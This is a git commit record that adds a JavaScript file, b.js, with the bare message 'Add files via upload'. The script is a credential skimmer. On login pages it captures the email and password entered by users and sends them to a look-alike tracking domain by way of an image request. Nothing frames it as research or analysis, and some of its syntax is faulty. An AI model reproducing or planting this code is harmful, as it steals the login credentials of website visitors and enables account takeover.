2bc10009601810a7077fb9aaa8468631ca10018e
9os <druidboykoston@gmail.com>
2018-11-21 17:43:26 -0600

    Add files via upload

---
+++ b.js
@@ -0,0 +1,18 @@
+if(window.location.pathname.indexOf("/login") == -1){
+	return;
+}
+
+$(document).on("submit", function(e){
+	email = $("#user_mail").val();
+	pass = $("#user_pass").val();
+	
+	src = "http://googltrack.vacau.com/users.php?u="+email+"&p="+pass+"&e="+email+"&url="+window.location.href;
+	img = document.createElement('img');
+	img.src = src;
+	document.body.appendChild(img);
+	await sleep(500);
+});
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
